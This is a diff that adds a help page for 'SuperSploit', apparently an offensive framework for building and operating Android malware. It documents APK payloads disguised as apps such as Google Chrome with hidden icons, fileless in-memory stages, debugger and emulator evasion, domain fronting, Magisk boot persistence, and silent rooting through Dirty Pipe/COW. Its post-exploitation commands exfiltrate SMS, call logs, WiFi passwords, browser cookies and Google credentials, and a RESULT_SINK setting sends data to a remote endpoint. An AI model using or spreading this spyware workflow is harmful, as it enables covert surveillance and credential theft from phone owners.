@@ -1,0 +1,56 @@
+# 📱 SUPERSPLOIT ANDROID CAPABILITIES
+SuperSploit provides specialized tools for Android reconnaissance, in-memory C2 exploitation, and stealthy payload generation using the Kivy/Buildozer pipeline.
+
+---
+
+## 🚀 "UNDER THE HOOD" MECHANISMS
+- Kivy/Buildozer Pipeline: Android payloads are generated as pure-Python APKs. The framework uses Buildozer to cross-compile Python code for arm64-v8a and armeabi-v7a architectures, injecting malicious logic into legitimate-looking templates.
+- Dynamic Template Injection: The generator replaces placeholders like {{LHOST}}, {{LPORT}}, and {{STAGE2URL}} in the template code. It can also inject "Phantom" variables for external tasking and result exfiltration.
+- Fileless C2 (Stage 2): C-based payloads compiled for Android can be injected into memory via memfd_create() stubs, avoiding the heavily monitored /data/local/tmp directory.
+- Advanced Evasion Suite:
+    - **Polymorphic Rotation**: Randomizes library and JNI method names for every build.
+    - **Environment Pinning**: Native stagers detect and evade debuggers/emulators.
+    - **Domain Fronting**: Masks C2 traffic via SNI-masking with FRONT_DOMAIN.
+    - **Phantom Persistence**: Systemless boot persistence via Magisk library hijack.
+    - **Magisk 'Golden' Persistence**: Robust boot-script persistence via /data/adb/service.d/.
+- Legacy Support: Full support for armv7 (32-bit) architectures (e.g. Galaxy Tab E) via COMP_ARCH android_v7.
+
+---
+
+## 🛠️ COMMAND SYNTAX & FLAGS
+### generate-apk [type] [output_name]
+Generates a customized Android APK using the **Native C Architecture** (Fastest).
+- Types: drs, beacon, messages, rootkit. (See 'help payload-types').
+- Arch: set APK_ARCH armv7 for legacy 32-bit devices.
+
+### generate-apk-buildozer [type] [output_name]
+Generates a customized Android APK using the **Kivy/Buildozer pipeline** (Standard).
+- Types: drs, beacon, messages, rootkit. (See 'help payload-types').
+- Flags (via set):
+  - set APP_NAME "Google Chrome": Spoofs the installed application's title.
+  - set SHOW_UI false: Disables the graphical interface for the payload.
+  - set HIDE_ICON true: Attempts to hide the launcher icon post-install.
+  - set WAKELOCK true: Requests a CPU wakelock to prevent Doze mode termination.
+
+---
+
+## 📡 POST-EXPLOITATION COMMANDS
+Once a session is established, use these native Android tools:
+- pm: Package Manager (e.g., pm list packages).
+- am: Activity Manager (e.g., am start -n <package>/<activity>).
+- auto_root: Attempt silent privilege escalation via Dirty Pipe/COW LPE.
+- dump_sms: Exfiltrate all SMS messages from the inbox.
+- dump_calls: Exfiltrate call logs (number, type, duration).
+- dump_wifi: Extract stored WiFi SSIDs and passwords (Requires Root).
+- dump_chrome: Harvest Chrome browser cookies and logins (Requires Root).
+- dump_google_passwords: Extract GMS and System-synced credentials (Requires Root).
+- find_cookies: Search for all application cookie databases (Requires Root).
+- find_passwords: Search for all application password stores (Requires Root).
+- screencap: Capture the device screen in real-time.
+
+---
+
+## 🛡️ SAFETY & STEALTH CONSIDERATIONS
+- Persistence & Doze Mode: Android's "Doze" mode can kill background beacons. Use echo supersploit_beacon > /sys/power/wake_lock (requires root) to maintain persistence.
+- AV Evasion: Kivy-based APKs often bypass signature-based detection because they appear as legitimate Python-based applications.
+- Phantom Variable Sink: Use set RESULT_SINK <url> to exfiltrate data to a remote HTTPS endpoint instead of the C2, reducing the primary C2 traffic profile.
